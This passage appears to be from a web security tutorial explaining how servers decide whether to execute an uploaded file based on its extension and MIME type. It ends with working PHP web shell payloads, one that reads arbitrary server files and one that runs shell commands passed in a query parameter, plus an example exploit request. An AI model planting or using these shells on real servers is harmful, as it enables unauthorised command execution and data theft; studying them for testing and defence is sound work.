
---
At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types.

- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information.

The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

Read arbitrary files from the server's filesystem:

```php
`<?php echo file_get_contents('/path/to/target/file'); ?>`
```

A more versatile web shell:

```php
`<?php echo system($_GET['command']); ?>`
```

Pass an arbitrary system command via a query parameter:

```
GET /example/exploit.php?command={arbitary bash command} HTTP/1.1
```

